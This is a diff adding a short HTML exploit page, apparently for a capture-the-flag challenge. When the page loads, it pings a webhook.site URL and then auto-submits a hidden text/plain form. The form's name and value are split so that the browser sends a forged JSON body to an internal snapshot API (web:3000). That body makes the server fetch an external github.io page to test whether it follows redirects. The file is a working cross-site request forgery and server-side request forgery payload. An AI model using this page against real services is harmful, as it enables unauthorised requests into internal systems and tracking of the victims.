@@ -1,0 +1,24 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Site Preview Snapshot Redirect Test — Submit</title>
+</head>
+<body>
+  <h1>Snapshot redirect test — submit</h1>
+  <p>This test sends exactly one top-level form submission from the challenge reviewer.</p>
+  <form id="probe" method="POST" action="http://web:3000/api/snapshot" enctype="text/plain" target="_self">
+    <input type="hidden"
+      name='{"url":"http://youyiwangwww.github.io/ctf-bot-test/redirect-follow-probe.html?tag=redirect-ctf-20261025-01","padding":"'
+      value='"}'>
+  </form>
+  <script>
+    (() => {
+      const beacon = new Image();
+      beacon.src = 'https://webhook.site/0a945959-6737-49f0-aeed-accf4d0b8713?event=redirect-submit&tag=redirect-ctf-20261025-01';
+      window.setTimeout(() => document.getElementById('probe').submit(), 800);
+    })();
+  </script>
+</body>
+</html>
